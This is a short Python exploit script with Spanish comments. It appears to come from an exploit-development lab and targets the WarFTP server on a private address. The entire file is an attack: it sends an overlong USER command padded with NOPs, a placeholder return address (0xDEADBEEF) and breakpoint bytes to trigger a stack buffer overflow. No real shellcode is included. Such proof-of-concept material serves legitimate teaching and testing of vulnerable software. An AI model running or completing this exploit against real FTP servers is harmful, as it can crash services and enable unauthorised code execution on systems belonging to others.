#!/usr/bin/python
import socket
# buffer = "\x90" * 485 Cantidad resltado del offset
# buffer += "\x90" * 100  Nops para rellenar 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "\x90" * 485
buffer += "\xEF\xBE\xAD\xDE"
buffer += "\x90" * (493-len(buffer))
buffer += "\xCC" * (1000-len(buffer))
s.connect(('10.0.2.16',21))
data = s.recv(1024)
print ("Enviando el WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Final")
